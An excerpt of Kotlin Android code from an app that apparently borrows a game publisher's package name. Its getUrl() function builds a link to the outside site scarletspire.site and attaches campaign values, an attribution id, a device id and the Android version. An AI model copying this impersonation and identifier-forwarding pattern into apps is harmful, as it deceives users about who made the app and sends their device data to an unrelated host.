...
import com.namcobandaigames.spmoja01.Constants.CAMP2
import com.namcobandaigames.spmoja01.Constants.CAMP3
import com.namcobandaigames.spmoja01.Constants.DEEP1
import com.namcobandaigames.spmoja01.Constants.DEEP2
import com.namcobandaigames.spmoja01.Constants.DEEP3
...
override fun onCreate(savedInstanceState: Bundle?) {
    ...
    view1  = findViewById(R.id.viewSpireS)
...
private fun getUrl(): String {
    ...
    val pack = "com.namcobandaigames.spmoja010"
    ...
    val first = "https://"
    val second = "scarletspire.site/2Nh76"
    ...
    var after = ""
    if (cpOne!=null){
        after = "$resultAB?$one$cpOne&$two$cpTwo&$three$cpThree&$four$pack&$five$afId&$six$mainid&$seven$androidVersion"
        Log.d("devLina", "Naming Install")
    } else
    {
        after = "$resultAB?$one$dpOne&$two$dpTwo&$three$dpThree&$four$pack&$five$afId&$six$mainid&$seven$androidVersion"
